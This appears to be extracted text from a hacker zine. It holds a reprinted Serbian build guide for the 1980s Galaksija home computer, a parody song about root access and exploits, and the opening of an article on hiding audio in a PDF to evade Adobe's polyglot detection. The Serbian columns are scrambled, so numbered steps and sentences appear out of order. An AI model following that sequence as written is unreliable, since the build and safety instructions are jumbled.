česta pojava. Pogledajte zaokružen deo slike — mi smo na
našoj štampi našli ne baš tako sitan most od tinola, koji je ko
montažnoj shemi. Dobra osobina ovakvog rasporeda je što
slučajnom zamenom džekova nećemo napraviti havariju. zna kako nastao na tako širokom prostoru izmedu dve staze
20. Naš trud je nagraden ovim lepim prizorom — čistim i
urednim štampanim kolom u uredaju koji će umeti da nam
višestruko uzvrati za uložen napor i strpljenje. „Galaksija”
će raditi za vas bolje od mnogih drugih elektronskih uredaja
u ovom veku elektronike, ispoljavajući osobinu koju ćemo po
prvi put sresti kod jedne naprave — ona će komunicirati sa
nama na takav način da ćemo imati utisak da je postala član
18. Pošto kod nas nije baš lako pronaći višepolni konek-
tor, štampu smo prilagodili tako da je moguće montirati više
različitih tipova konektora, ako imaju standardni korak od
2,54 mm. Kao najpovoljnije rešenje, mi smo odabrali doda-
vanje još jedne male dvoslojne štampane pločice, koja je tako
projektovana da na nju može da se priključi višežilni kabl sa
44-polnim „EDGE” (“ivičnim”) konektorom, jer je takav tip
najlakše nabaviti, a i cena mu je pristupačna.
porodice. Zaista, nije neobično što mnogi svoj računar sma-
traju svojim prijateljem.
4710.2
Pročitajte i ovo — Opasne kriv-
ine
• Poželjno je koristiti uzemljenu lemilicu. Ako
nemamo takvu, možemo se poslužiti običnom,
ako hladniji kraj metalnog dela lemilice
(bliže ruci) obavijemo nekoliko puta bakarnom
žicom, čiji drugi kraj spojimo sa uzemljenjem
na šuko-utičnici.
Ako za sobom imate dosta sagradenih uredaja
(koji su uz to još i proradili), svakako se nećete baš
doslovno pridržavati svih naših uputstava. Ipak, po-
stoje pravila koja ne smete prekršiti, jer biste time
sigurno izazvali trajna oštećenja komponenata. Na-
brojaćemo najbitnija.
• Ako u prostoriji u kojoj radimo imamo sin-
tetički tepih, statički potencijal našeg tela u
odnosu na zemlju može da dostigne čak 300
volti! To nas ne ugrožava mnogo, jer će se
taj naboj „isprazniti“ za vrlo kratko vreme
kad dodirnemo neki uzemljeni predmet, ali
ako se isprazni kroz nožicu MOS ili CMOS
čipa — verovatno će ga učiniti neupotreblji-
vim. Zato se takvi čipovi čuvaju u takozvanim
anti-statičkim cevima, a mogu biti i utaknuti
nožicama u specijalni provodni sunder ili jed-
nostavno umotani u staniol.
• Kratak spoj izmedu pozitivnog i negativnog
voda za napajanje računara će oštetiti stabi-
lizator 7805. Neki proizvodači ugraduju auto-
matsko strujno ograničenje u ovaj čip, ali to
nemojte da proveravate. Isto tako, slučajna
zamena pozitivnog i negativnog voda od ispra-
vljača do računara će sasvim sigurno biti fa-
talna za sve čipove.
• Skoro svi čipovi u računaru „galaksija“ imaju
radi napon od + 5 V, pri čemu su dozvoljena
odstupanja od ± 0,25 V. Integrisana kola će
preživeti šokove do 7 V, dok su prekoračenja
ovog napona opasna.
• Kratak spoj bilo kog izlaza TTL kola (to su
čipovi serije 74LS...) sa pozitivnim vodom za
napajanje će trajno oštetiti to kolo. Kratak
spoj izlaza sa masom je bezopasan, i možemo
ga slobodno primenjivati prilikom eksperimen-
tisanja. Ovde treba samo paziti da se ne do-
godi da veći broj izlaza istog čipa bude spojen
sa masom istovremeno. • Naši čipovi će biti potpuno sigurni u toku le-
mljenja ako napravimo još nekoliko namotaja
neizolovane žice oko dela lemilice koji držimo
rukom, a drugi kraj žice spojimo sa uzemlje-
nim metalnim delom. Tako smo i mi, pošto
dolazimo u dodir sa čipom, na istom potenci-
jalu.
• U slučaju loše sinhronizacije slike na ekranu
monitora, eksperimentisaćemo sa različitim
vrednostima otpornika R12, R13, R9 i R10.
Nema nikakvih opasnosti ako R12 ili R13 nisu
manji od 330 oma, i ako R10 nije manji od 40
oma. • Kad jednom ugradimo čip, on više nije to-
liko ugrožen, tako da se po završetku montaže
možemo osloboditi svih mera predostrožnosti.
• Priključivanje monitorskog izlaza (bez RF
modulatora) na TV prijemnik sa „vrućom
šasijom“ je opasno ne samo za čipove, već i
za vaš život. Zbog velike važnosti, ovoj temi
smo posvetili poseban tekst „Jednostavan za-
hvat, fantastični efekti“.
10.3
Izrada kutije računara — Konac
delo krasi
Mehaničku koncepciju kutije prepuštamo vama,
ali ćemo vam dati i jednu ideju: pošto na obodu
osnovnog štampanog kola ima dovoljno bakra, stra-
nice se mogu iseći od istog takvog vitroplasta i jed-
nostavno zalemiti za ploču sa komponentama. Tako
štampana ploča postaje mehanički osnov cele kutije,
za šta vitroplast zadovoljava i najstrožije mehaničke
zahteve.
• Pošto su MOS i CMOS čipovi vrlo osetljivi
na statički elektricitet, potrebno je pažljivo
rukovati s njima. Verujući da je većina kon-
struktora već upoznata sa tehnikom rada sa
ovim čipovima (u računaru „galaksija“ to su
CD4017, CD4040, 2716, 2732, 6116 i Z80A),
navešćemo samo nekoliko osnovnih saveta:
48Kutija
2. Najpre treba obeležiti i očistiti tvrdom gumicom ili finim
brusnim papirom sve spojne površine koje ćemo lemiti. Za-
tim ćemo dobro zagrejati lemilicu od 24 ili 30 W i kalajisati
očišćene površine. Biće lakše ako koristimo i pastu za lemlje-
nje.
1. Pažljivo ćemo isplanirati dimenzije svakog dela kutije na
papiru. Moramo tačno znati koja stranica preko koje prelazi
na sastavima. Delovi se lako i precizno isecaju popularnim
OLFA skalpelom, zasecanjem linije sa obe strane ploče. Posle
toga, ako su žljebovi dovoljno duboki, lako je slomiti ploču po
zasečenoj liniji. Posle ovakvog sečenja finom turpijom treba
obraditi ivice. Ivice koje se leme obraduju se ravno, a slo-
bodne ivice zaobljeno.
493. Pre lemljenja celog sastava, zalemićemo stranicu samo u
nekoliko tačaka. Tako ćemo moći pažljivo da izvršimo kon-
trolu i eventualne korekcije. Treba znati da je jednom za-
lemljenu stranicu kutije praktično nemoguće razlemiti bez
oštećenja.
5. Posle stroge provere medusobnog položaja i ugla, za-
lemićemo ceo sastav dve površine. Verovatno će biti po-
trebno da posle svakih nekoliko centimetara sačekamo da se
rashladeni vrh lemilice ponovo zagreje. Možda bi ovaj pro-
blem bio rešen malo jačom lemilicom, ali je to pomalo opasno
rešenje: pregrejani bakar se odlepljuje od vitroplasta.
4. Kod lemljenja stranica treba obratiti pažnju na skupljanje
legure kalaj-olovo pri hladenju: ako želimo prav ugao, po-
stavićemo ploče pod tupim uglom (gledano sa strane sa koje
se lemi; na slici je to donja strana), jer će posle lemljenja
tinol „povući” ploče jednu prema drugoj. Tako ćemo posle
hladenja dobiti prav ugao.
6. Na unutrašnju površinu poklopca ćemo zalemiti nekoliko
stranica visine oko 10 mm, koje mogu da se podese da tesno
ulaze u stranice kutije. Zato posebno učvršćenje poklopca za
kutiju nije ni potrebno.
509. Neophodno je da finim brusnim papirom obrusimo celu
površinu koju ćemo obojiti. Nigde ne sme da bude sjajna, jer
bi sa takvih mesta boja brzo otpala. Dobro ćemo je očistiti i
odmastiti benzinom.
7. Da bi poklopac bio otporniji na savijanje, zalemićemo
jednu traku od vitroplasta i kroz sredinu. Ostalo nam je još
samo dno kutije — možemo ga napraviti od bilo kog mate-
rijala koji ne provodi struju. Mi ćemo dati prednost ploči
od pleksiglasa, debljine oko 4 mm, koju ćemo pričvrstiti za
glavnu ploču sa četiri zavrtnja M3 sa kontra-navrtkama ili
distancerima za spajanje dve površine na rastojanju.
10. Ravnomerno ćemo naprskati površinu svetlijom bojom
(najbolje belom). Biće korisno ako proučimo uputsvo sa
bočice spreja. Ovaj sloj treba da se suši najmanje tri časa,
ali ne na hladnom ili vlažnom vazduhu.
8. Ako želite da obojite kutiju i ispišete sve potrebne oznake
— i tu vam možemo pomoći dobrim savetom. Postoji, naime,
postupak koji ima sve dobre osobine sito-štampe, daje estet-
ski dobre rezultate, ima veliku mehaničku otpornost, a može
se lako izvesti u amaterskim uslovima. Treba da pripremimo
dva auto-lak spreja (najbolje da jedan bude beli a drugi tam-
niji, recimo medio-plavi, broj 469), bočicu benzina za čišćenje
i lithoset-slova I, eventualno, linije.
5111. Lithoset-slovima ćemo preko tek osušene površine ispisati
sve potrebne tekstove. Ako izvučemo i linije po obodu kutije i
pored otvora za tastaturu, dobićemo lepši izgled. Čistim i su-
vim prstom ćemo pritisnuti svako slovo, da bismo bili sigurni
da je dobro zalepljeno.
13. Posle oko jednog časa sušenja (ne mnogo duže!), pažljivo
ćemo noktom izgrebati slova i linije. Možda će posle ove faze
rada poklopac izgledati pomalo neprecizno i neuredno. Ne
obraćajmo, zasad, pažnju na to.
12. Pažljivo ćemo sve to preprskati tamnijom bojom. Ovaj
sloj treba da bude što ravnomerniji i tanji, tek toliko da se
ne providi bela boja.
14. Kad na čistu krpicu ili papirnu maramicu stavimo malo
benzina za čišćenje i protrljamo površinu, bićemo iznenadeni
veoma lepim izgledom slova i linija.
5210.4
Bez ovog se ne može — Is-
pravljač i stabilizator za napa-
janje
Električna shema ispravljača
Odmah ćemo reći da se stabilisani napon 12 V
koristi samo za napajanje RF modulatora, i da ga
možete izostaviti ako ne ugradujete modulator ili
imate takav koji se napaja naponom 5 V. Time biste
uštedeli komponente D3, D4, D5, С4, C5 i R1. Kon-
denzator C6 na primarnoj strani mrežnog transfor-
matora služi za eliminisanje neželjenih smetnji koje
bi se mogle pojaviti iz mreže. Ispravljač je punota-
lasni, i na elektrolitskom kondenzatoru C1 se dobija
oko 11 V ispravljenog i filtriranog napona. Inte-
grisani stabilizator 7805 obezbeduje oko 1A struje
pri naponu od 5 V. Dobro je upotrebiti i transfor-
mator koji može da napaja strujom te jačine, bez
obzira što računar troši svega oko 0,4 А. Ostatak
struje neka služi za kasnije napajanje eventualnih
proširenja. Kondenzatori C2 i C3 osiguravaju 7805
protiv oscilovanja. Pošto stabilizator 7805 u toku
rada oslobada veliku količinu toplote, potrebno ga
je montirati na hladnjak. Ako nemamo fabrički,
možemo ga napraviti od tri komada aluminijumskog
lima dimenzija 35×80, 35×110 i 35×140, od kojih
se svaki na dva mesta oštro savije u obliku slova U.
Otvor na metalnoj zastavici stabilizatora je za zavr-
tanj M3, kojim se on dobro stegne za hladnjak. Pre-
Montažna shema ispravljača
Štampano kolo ispravljača
53teško nabavljaju, dva elektrolita od po 100 μF koje
vezujete kontra-redno (plus polovi jedan prema dru-
gom, a minus polovi su za utičnicu i prekidač koji
služi za izbor funkcije televizora, ne odričemo se, da-
kle, ni TV prijemnika). Na zadnjoj ploči televizora
izbušite otvor za montažu prekidača i utičnice za vi-
deosignal. Za povezivanje je dobro koristiti što kraće
vodove koji, po mogućstvu, treba da budu oklopljeni
(„širmovani“) ili bar da im parice budu spiralno uvi-
jane, jedan kabl oko drugog. Ista preporuka se od-
nosi i na kabl koji povezuje računar i novi monitor.
Time je prepravka završena. Zatvorite televizor i
spojite ga sa računarom. Kada ih uključite, biće
verovatno potrebno odredeno podešavanje horizon-
talne i vertikalne sinhronizacije, kao i podešavanje
televizora na najjači kontrast, pri kome se slova još
ne „razmazuju“.
poručljivo je pre montaže dodirnu površinu stabili-
zatora namazati sa malo silikonske paste, radi boljeg
odvodenja toplote. Nikakvi liskunski izolatori nisu
potrebni. Izaberite sami u kakvu kutiju ćete mon-
tirati ovaj ispravljač i transformator. Poželjno je
da ima otvore za hladenje, i ako je metalna, obave-
zno treba mrežni napon dovesti trožilnim kablom sa
„šuko-utikačem“. Žuto-zeleni vod kabla se sa jedne
strane spaja sa listićem za uzemljenje šuko-utikača,
a sa druge za masu metalne kutije i minus-pol ispra-
vljača.
10.5
Jednostavan zahvat — fan-
tastični efekti
Da bismo običan crno-beli televizor pretvorili
u monitor, moramo da poštujemo jedno važno
ograničenje: video ulaz može da se doda samo te-
levizoru koji ima mrežni transformator. TV pri-
jemnici sa „vrućom šasijom“ su vrlo opasni za pre-
pravke jer su galvanski spojeni sa računarom i tako
ugrožavaju život onoga ko upravo radi sa njim.
Kako da proverite da li vaš televizor ima „vruću
šasiju“? Ako nemate dovoljno iskustva i predznanja,
odustanite od tog posla ili ga prepustite stručnjaku.
Ako ste sigurni u svoje znanje, otvorite televizor i
uključite ga u mrežu (to je ono što, prema uput-
stvima proizvodača, „nikada ne smete da radite“),
nikako ne dodirujući njegove metalne delove. Izme-
rite potencijal mase televizora u odnosu na zemlju.
Isključite mrežni utikač, okrenite ga za 180 stepeni
pa ponovite merenje. Ako ste u bilo kom slučaju
očitali neki napon, zatvorite televizor i odustanite
od dalje prepravke. Rešenje vašeg problema se zove
RF modulator. Ako ni u jednom slučaju niste re-
gistrovali napon, možete da nastavite sa proverom.
Otpor izmedu bilo kog pola mrežnog priključka tele-
vizora i mase mora da bude beskonačno veliki (meri
se, naravno, sa isključenim napajanjem). Ako je i
ova provera dala pozitivan rezultat, imate „zeleno
svetlo“ za prepravku. Najpre nabavite shemu vašeg
TV prijemnika, rad bez nje nema smisla. Pronadite
ulaz u prvi stepen video-pojačavača. Tu je obeležen
napon takozvanog „belog nivoa“, a sink je 2 volta
ispod toga. Tranzistorski TV prijemnici najčešće
imaju „beli nivo“ na + 3 V, a sink na + 1 V. Osta-
vljajući prednapon iz razdelnika priključen na bazu
tranzistora, otkačite vod koji dovodi signal iz video-
detektora i povežite ga prema našoj slici. Potrebno
je da dodate jedan bipolarni elektronski kondenza-
tor od oko 50 μF ili, pošto se bipolarni elektroliti
Razdelnik za televizor
10.6
Prvo uključivanje — Bez panike,
sve će biti u redu
Štampano kolo logičke sonde
Montažna shema logičke sonde
54instrument i priključimo monitor preko video-ulaza
(ili TV prijemnik preko antenskog), povežimo ispra-
vljač sa računarom i uključimo ga. Ako koristimo
RF signal i TV prijemnik, preći ćemo skalu televi-
zora na sva tri opsega da bismo našli gde je prijem
najbolji. Računar će napisati prvu reč u svom životu
— „READY“ (spreman).
10.6.1
Električna shema logičke sonde
Važno je da proradi — ne mora iz
prve
Ako računar ne proradi „iz prve“, ne dopustite da
vas obuzme panika: prolazne teškoće su sastavni deo
amaterskog rada. Ako slika postoji ali je nestabilna,
pokušajte sa podešavanjem vertikalne i horizontalne
sinhronizacije TV prijemnika ili monitora (regula-
tori se nalaze na zadnjoj strani aparata; kod ne-
kih televizora moraju da se podešavaju odvrtkom).
Ako se na ekranu ništa ne vidi, pojačajte osvetlje-
nje ekrana. Možda se sada, umesto jedne, vidi devet
malih slika (u tri reda po tri) koje su crno oivičene i
bez teksta. Ovu pojavu nije teško otkloniti: kvarc,
umesto na 6.144 MHz, osciluje na tri puta višoj fre-
kvenciji. Dovoljno je da ugradite kondenzator C5
čija kapacitivnost iznosi izmedu 10 i 30 pF. Za nje-
govo dodavanje, kao i za bilo koju drugu prepravku,
treba isključiti računar iz mreže. Ako je računar
potpuno nem, dodirnite oprezno prstom svaku kom-
ponentu, posebno IC kola. Hladnjak stabilizatora
bi već posle nekoliko minuta rada trebao da bude
topao, a nešto malo i ispravljačke diode i mrežni
transformator. Od čipova sme umereno da se za-
greva mikroprocesor (ne toliko da ne možemo da
držimo prst na njemu!) i EPROM-i. Ako je nešto
pregrejano, bar znamo gde da tražimo kratak spoj.
Najpre uključite u mrežu samo ispravljač. Izme-
rite napone: stabilisani napon od 5 V ne sme da
odstupa više od ± 0,25 V. Za 12 V (napon koji je
potreban za neke RF modulatore) odstupanja mogu
da budu i ± 1 V. Pošto ste se uverili da su naponi
u dozvoljenim granicama, spojite mase ispravljača i
računara komadom žice, merni instrument podesite
na najširi opseg merenja jačine struje, pa plus pip-
kom instrumenta dodirnite + 5 V izlaz ispravljača,
a minus pipkom ulaz za + 5 V na računaru. In-
strument treba da pokaže struju izmedu 300 i 500
mА. Аko je dobijena vrednost u ovim granicama,
uklonite instrument sa + 5 V i ponovite isto sa + 12
V. Zavisno od tipa upotrebljenog RF modulatora
(on se jedini napaja strujom koju merimo), otklon
kazaljke treba da bude nekoliko miliampera. Da bi-
smo ga registrovali, dakle, moramo da smanjimo op-
seg instrumenta. Ako je sve u redu, sklonimo merni
10.6.2
Skriveni kvarovi i ćudljive greške
Moguće je, naravno, da je kvar tako dobro „sa-
kriven“ da se još uvek nije pokazao. U tom slučaju
je sasvim moguće da na štampi postoji neki kra-
tak spoj. Isključite ispravljač, uzmite AVO-metar
i na opsegu od om × 1 strpljivo ispitajte sve bli-
ske vodove. Usput proverite i da li je nožica nekog
čipa ostala, možda, nezalemljena, a zatim okrenite
štampanu ploču i ponovo proverite ispravnost raspo-
reda komponenti. Postoji i mogućnost da računar
radi, ali uz neke specifične nedostatke: kada, re-
cimo, pritisnete neki taster, pojave se dva slova ume-
sto jednog. U tom slučaju je sasvim sigurno nastu-
pio kratak spoj na linijama od čipova 741-S251 i
74LS156 (nalaze se jedan pored drugoga) do tasta-
55grešku, moraćete da potražite pomoć nekog
stručnjaka. Čini nam se da je taj put jednostav-
niji nego da počnete da učite elektroniku. Postoji,
najzad, i jedan problem koji se rešava čisto softver-
ski: ukoliko je slika na vašem monitoru (televizoru)
pomerena previše ulevo, svaki put kada uključite
računar moraćete da otkucate ВYТЕ 11176, 12 i
pritisnete (RET) (u ekstremnijem slučaju upotre-
bite naredbu BYTE 11176,13). Slično tome, ako je
slika pomerena udesno, možete da otkucate BYTE
11176,10 (ili čak BYTE 11176,9) i pritisnete (RET)
svaki put kada uključite računar.
Tekst: Voja Antonić Crteži: Mirjana Antonić
Fotografije: Ivan Ivanov
ture. Ako snimite situaciju i zaključite koji se pa-
rovi slova pojavljuju zajedno, moći ćete, gledajući
razmeštaj tastera u matrici (na shemi) da tačno
utvrdite koje su linije kratko spojene. Moguće je
da se redovi teksta na ekranu krive po horizon-
tali, naročito u poslednjim redovima. To govori o
neprilagodenosti signala za sinhronizaciju slike, pa
će biti neophodno da eksperimentišete sa promenom
otpornosti R9 i R10 (R9 ne sme da bude manja od
40 oma, jer će u protivnom biti ugrožen čip 741S38).
10.6.3
Alatka za tvrdokorne greške
Za posebno „tvrdokorne“ greške treba napraviti
jednu pomoćnu alatku: zove se logička sonda i može
biti korisna i u mnogim drugim prilikama. Za nju su
potrebna dva čipa. 74LSO4 i 74US90, šest led dioda,
jedan kondenzator i nekoliko otpornika. Pomoću ove
sonde možemo da utvrdimo da li je logički nivo na
nekoj od linija visok (svetli prvi LED), nizak (drugi
LED) ili postoje povorke impulsa (tada preostale
četiri LED ne prikazuju statičnu situaciju nego tre-
pere, najčešće tako brzo da imamo utisak da sva
četiri svetle, statična situacija, bez povorke impulsa,
ne može nikada da upali sve četiri LЕ diode). Naj-
bolje je da masa i napajanje sonde budu dve raz-
nobojne fleksibilne žice dužine oko 50 cm koje se
završavaju „krokodil-hvataljkama“. Njima ćemo, ne-
gde sa uredaja koji ispitujemo (to ne mora da bude
samo računar „galaksija“), dovesti stabilisanih 5 V
pazeći na polaritet — greška može da ošteti sondu.
Zatim ćemo, dodirujući zašiljenim vrhom sonde ka-
rakteristične tačke, očitavati logička stanja. Naj-
pre ćemo se uveriti da li oscilator radi. Nožica 10
čipa 74LS32 mora da pokazuje naizmenični signal,
što znači da su svi LED-ovi upaljeni. Dalje pra-
timo lanac delitelja: nožica 2 kola 74LS93, nožica
14 kola CD4040, nožica 2 kola CD4017. Svako od
ovih mesta pokazuje isto stanje na sondi, izuzev po-
slednjeg, kod koga je učestanost dovoljno niska da
primetimo kako neki LED-ovi trepere. Ako negde
postoji statično stanje, našli smo grešku. Pažljivo
proverimo okolnu štampu: ako na njoj nema greške,
moraćemo da zamenimo čip. Nožica 26 mikroproce-
sora mora oko pola sekunde po uključivanju da po-
kazuje nizak logički nivo, a zatim stalno visok. Ako
nije tako, proverite tranzistor vezan za tu nožicu i
elektrolitski kondenzator koji spaja R5 sa + 5 V.
10.6.4
10.7
Nabavka delova za računar
„Galaksija“ — Komponente i
kako ih steći
Samogradnja računara, čak i u sredinama u
kojima se mikroprocesori kupuju „na kilo“, nije
baš sasvim jednostavna stvar. Neki ključni delovi
računara, kao što je ROM, ne nalaze se u slobodnoj
prodaji nigde u svetu, a do nekih, kao što je tasta-
tura, ne dolazi se ni jeftino ni lako. Kod nas, gde je
često teško naći i najobičniji otpornik, upuštanje u
jednu takvu avanturu može izgledati potpuno bez-
umno. Pokazuje se, medutim, da je moguće savla-
dati i jednu takvu prepreku. Kako?
Zahvaljujući razumevanju i ljubavi prema
računarima nekolicine domaćih proizvodača, „Ga-
laksija“ je uspela da za čitaoce ovog izdanja obez-
bedi barem one komponente bez kojih bi samograd-
nja računara predstavljala zaista samoubilački čin
— ROM, tastaturu i pločicu sa štampanim vezama
— i to po cenama koje su znatno ispod tržišnih!
(Štampano kolo će hobiste koštati 40 odsto jeftinije
nego „Elektroniku Inženjering“, mada oni plaćaju
porez na promet, a privredna organizacija ne!). Po-
red toga, uspeli smo da sklopimo i dosta povoljan
aranžman za nabavku poluprovodničkih komponenti
iz inostranstva. U ovom času su pod znakom pitanja
samo kutija računara i demonstraciona kaseta. Kli-
zajući kurs dinara podiže cene svemu, pa je podigao
cenu i računaru „galaksija“. Definitivna cena zavisi
od načina nabavke čipova iz inostranstva. U najne-
povoljnijem slučaju, ako vam carinici ne progledaju
kroz prste za nekoliko čipova od kojih se sastoji „ga-
laksija“, ona ne bi trebalo da bude veća od 15.500
dinara (komplet mehaničkih delova = 4600, komplet
čipova = 6500 carina 3250, kutija i pasivne kompo-
Drugi možda znaju više
Ako ni posle svih ovih operacija niste pronašli
5610.7.2
nente = 1200 dinara), ali ne može biti manja od
11.000 dinara.
10.7.1
Integrisana kola
Potencijalne graditelje „galaksije“ ništa, valjda,
ne brine toliko kao nabavka integrisanih kola. Ona
se, na žalost, mogu kupiti samo u inostranstvu. Ra-
zloga za brigu ima zaista dosta: kako uskladiti na-
rudžbu sa strogim carinskim propisima, kako obja-
sniti na nepoznatom jeziku što vam je, zapravo, po-
trebno, kako izvršiti uplatu? Postupak je, u osnovi,
jednostavan: treba pisati stranoj firmi i zamoliti
za profakturu. Kada predračun stigne, sa njim se
odlazi u banku da bi se izvršila uplata — tzv. devi-
zna doznaka za inostranstvo. Svako, medutim, ko je
njime prošao zna koliko je težak taj put. Drugog, na
žalost, nema. Jedno nikada ne gubite iz vida: maksi-
malna vrednost jedne pošiljke ne sme da prelazi 1500
dinara, inače će biti vraćena i nikada neće stići do
vas. Da bi bar malo pojednostavila proceduru, „Ga-
laksija“ je sklopila aranžman sa firmom „Microtech-
nica“ iz Graca. Cena kompleta integrisanih kola, RF
modulatora, kvarca i tri podnoža iznosi 1000 šilinga
(oko 6500 dinara) za verziju od 4 k RAM-a (da čipa
6116), odnosno 1116 šilinga za verziju od 6 k RAM-
a (tri čipa 6116). U cenu su uračunati i poštanski
troškovi. Isporuka će biti vršena potpuno u skladu
sa našim carinskim propisima. Da bi se izvršila na-
rudžbina, dovoljno je zatražiti (na srpskohrvatskom)
predračun delova za računar „galaksija“. Plaćanje se
može izvršiti i jednom od sledećih kreditnih kartica.
American Expres, Diners, Eurocard i Visa. Svim
kupcima kompleta čipova za računar „galaksija“
„Microtechnica“ će besplatno programirati EPROM-
e. To značajno skraćuje proceduru i ubrzava put
do računara „galaksija“. Narudžbinu treba izvršiti
na adresu: „MICROTECHNICA“, A-8042 GRAZ,
St. PETER HAUPTSTRASSE 10. AUSTRIJA.
Оbjavljujemo, takode, i adrese dva dobra distribu-
tera iz Engleske (AMBIT INTERNATIONAL, 200
NORTH SERVICE ROAD, BRENTWOOD, ES-
SEX, ENGLAND) i Nemačke (BÜRKLIN, SHIL-
LERSTRASSE 40,8000 MÜNCHEN).
Mehaničke komponente
Mehaničke komponente računara „Galaksija“ —
štampano kolo, konektorska pločica, maska za ta-
stere i tasteri sa kapicama — obezbeduju Institut
za vakuumsku tehniku iz Ljubljane (tasteri) i firme
MIPRO, i Elektronika iz Buja (sve ostalo). Tasteri
koji će biti ugradeni u računar „galaksija“ zadovo-
ljavaju sve profesionalne standarde — isti takvi se
ugraduju i u terminale nekoliko domaćih kompjuter-
skih sistema. Štampano kolo (razume se, od vitro-
plasta!) ima, takode, profesionalni izgled i kvalitet.
Vodovi su zaštićeni najpre galvanskim putem a za-
tim i tzv. stop-lakom (to je ona zelena boja kojoj
profesionalne ploče najviše duguju za svoj šarm).
Sa gornje strane je štampan raspored elemenata.
Ovakav kvalitet znatno olakšava sklapanje računara:
mogućnost da se neka komponenta pogrešno postavi
ili da se na vodovima nepažnjom napravi „tinolski“
most svedena je na teorijski minimum. Cena kom-
pleta iznosi 4300 dinara i odredena je tako da se
pokriju proizvodni i poštanski troškovi, kao i porez
na promet, na koji odlazi gotovo trećina sume! (U
cenu nije uračunata konektorska pločica — očekuje
se da neće biti skuplja od 300 din). Ovako popu-
larna cena predstavlja podršku firmi MIPRO i Elek-
tronika iz Buja i njihovih vlasnika Zvonka Jurasa
i Blaža Krakića akciji „Galaksije“ u širenju ideje o
kućnim računarima. Uz ovako povoljnu cenu idu, na
žalost, i izvesna ograničenja, koja ne bi trebalo da
brinu one koji na vreme donesu odluku da sagrade
računar „galaksija“. Сеna važi samo do 31. januara
za narudžbenice koje stignu preko redakcije „Galak-
sije“. МIPRO, i Elektronika će i nakon tog roka
primati narudžbine, ali će isporuku vršiti po eko-
nomskim (znači i znatno višim) cenama. Delovi se,
uz to (na žalost vlasnika račinara ZX Spectrum i ZX
81) mogu naručiti samo u paketu. Stotini čitalaca
komplet mehaničkih komponenti će biti isporučen sa
specijalnim popustom za 3660! Kojoj stotini? Pr-
voj koja pošalje narudžbenice — 5. januara i posle
toga! Zašto baš petog? Zato što ovo specijalno iz-
danje ne stiže na sve kioske u isto vreme. Želimo,
jednostavno, da svi čitaoci budu u ravnopravnom
položaju! isporuka počinje 15. januara. Narudžbinu
treba izvršiti na adresu: „Galaksija“, 11000 Beograd,
Bulevar vojvode Mišića 17.
10.7.3
Programiranje EPROM-a
Bez sistemskih programa koje treba upisati u
EPROM-e 2732 (ROM) i 2716 (karakter-generator)
računar „galaksija“ je potpuno bespomoćan. Čitaoci
koji naruče komplet delova od „Microtechnice“
dobiće isprogramirane EPROM-e — dakle potpuno
spremne za ugradnju. Čitaoci koji su već nabavili
EPROM-e ili nameravaju da ih nabave preko nekog
drugog distributera, treba da ih pre ugradnje pošalju
5710.7.5
redakciji na programiranje. Usluga je potpuno bes-
platna, a obaviće je beogradska firma MIPRО (nije
greška — postaje dve firme MIPRO i obe učestvuju
u našoj akciji!), u kojoj je započet razvoj računara
„galaksija“. EPROM-e možete početi da šaljete od-
mah — biće vam vraćeni u roku od petnaest dana.
U pošiljku ubacite dovoljno poštanskih maraka za
povratno pismo — isto onoliko koliko ste morali da
zalepite na nju da biste nam je poslali. Raspi-
tajte se, dakle, pre slanja o tarifi na svojoj pošti.
Vrednosno pismo predstavlja najsigurniji način da
EPROM-i stignu bezbedno do redakcije i do vas na-
zad. EPROM-e treba slati na adresu: „Galaksija“,
11000 Beograd, Bulevar vojvode Mišića 17.
10.7.4
1.13 Hitna pomoć
Neiskusni konstruktori ne treba da se plaše da
će ostati sami ako negde zapnu u toku sklapanja
računara „galaksija“. U saradnji sa radio-klubom
„Avala“ iz Beograda organizovali smo službu hitne
pomoći koja će dežurati svakoga dana od 17 do 20
časova uz telefon 011/402.-687. Sa ovim klubom
ćemo, takode, organizovati i besplatne kurseve za
sklapanje računara. Detaljnija obaveštenja ćete naći
u februarskoj „Galaksiji“ — u svakom slučaju pre
nego što vam pode za rukom da kompletirate de-
love.
Da li važe preliminarne narudžbenice?
Preliminarna narudžbenica za tastaturu i
štampano kolo koju smo objavili u časopisu „Ga-
laksija“ imala je za cilj da nam pomogne da tačno
procenimo interesovanje za samogradnju računara
„galaksija“ (i adekvatno se pripremimo za čitavu ak-
ciju) ali na osnovu njih ne možemo da vršimo ispo-
ruku. Molim vas, zato, da nam pošaljete priloženu
narudžbenicu, bez obzira da li ste već poslali preli-
minarnu narudžbenicu iz „Galaksije“ ili ne. Isporuku
ćemo vršiti samo na osnovu priložene narudžbenice.
Voja Antonić (in the back) and his friend Jova Regasek assembling Galaksija
585911
Root Rights are a Grrl’s Best Friend
by f bz
The trolls are glad to lie for views
They delight in online duels.
But I prefer a man page that describes extensive tools.
A shell on the sys may be quite continental
But root rights are a grrl’s best friend.
sudo may be grand, but it won’t pay the rental
On your hosting fee, or help you with the disassembly.
RAM gets cold as exploits get sold
And we all mine bitcoin in the end.
But exploit or shell script, priv escalation keeps its shape!
Root rights are a grrl’s best friend!
There may come a time when a hacker needs a lawyer,
But root rights are a grrl’s best friend.
There may come a time when a tech firm employer
Offers you stock options
But get root rights and your own machines.
Perks will fly when stocks are high,
But beware when they start to descend.
Machines will go offline and no more command line!
Root rights are a grrl’s best friend!
I’ve heard of servers where you get admin accounts,
But root rights are a grrl’s best friend.
And I think that machines that you admin yourself
Are better bets. If nothing else, big data sets!
Unix time rolls on, entropy is gone,
And you can’t get that file to prepend.
But big racks or botnets you get props for root logins!
Root rights, root rights, I don’t mean jail breaks,
Root rights are a grrl’s best, best friend!
6012
What if you could listen to this PDF?
by Philippe Teuwen
To honor the tradition of polyglot releases, this PDF is also an audio file featuring a 24-bit studio
recording of f bz’ Root Rights are a Grrl’s Best Friend, which you can enjoy with MPlayer or VLC media
player.
There are some official ways to embed an audio file in a PDF, such as L A TEX’s media9 package. Unfortu-
nately, that would only work in Adobe Acrobat Reader, provided that you also install Adobe Flash—quite a
reckless prerequisite nowadays. We are not such bad neighbors, so we looked for alternatives.
Adobe, once again, is out to search-and-destroy polyglots, so all common audio file types such as WAV,
MP3, M4A, 3GP, AAC, FLAC, are prohibited. Still, some less popular formats remain undetected, up until
now! Among the free lossless formats these are True Audio (.tta) and WavPack (.wv).
TTA frame structure 30 is unfortunately too rigid and doesn’t allow much trickery to inject the start of
the PDF within the first kilobyte. It supports standard tagging by ID3v1/v2 and APEv2, but prepending
ID3 info is banned by Acrobat. The APEv2 specification, 31 on the other hand, strongly recommends against
using it at the beginning of a file. In practice, audio readers don’t support files starting with APEv2.
